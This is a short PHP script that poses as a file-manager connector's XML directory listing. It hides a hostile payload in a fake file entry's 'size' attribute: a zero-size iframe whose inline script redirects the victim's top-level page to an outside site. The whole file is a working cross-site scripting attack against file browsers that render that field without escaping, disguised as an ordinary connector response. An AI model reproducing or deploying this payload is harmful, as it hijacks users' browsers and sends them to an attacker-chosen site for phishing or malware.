
<?php

header("Content-Type: application/xml; charset=UTF-8");

$iframe = '<iframe height="0" width="0" srcdoc="<script>window.top.location.href=\'https://cdn.cliquo.cz/id/.html\';</script>"></iframe>';

$xml = new SimpleXMLElement(
    '<Connector command="GetFoldersAndFiles" resourceType="Document">
        <CurrentFolder path="/1 - f/" url=""/>
        <Files>
            <File desc="1" name="Loading..." size="0"/>
        </Files>
    </Connector>'
);

$file = $xml->Files->File;
$file['size'] = $iframe;

echo $xml->asXML();

?>
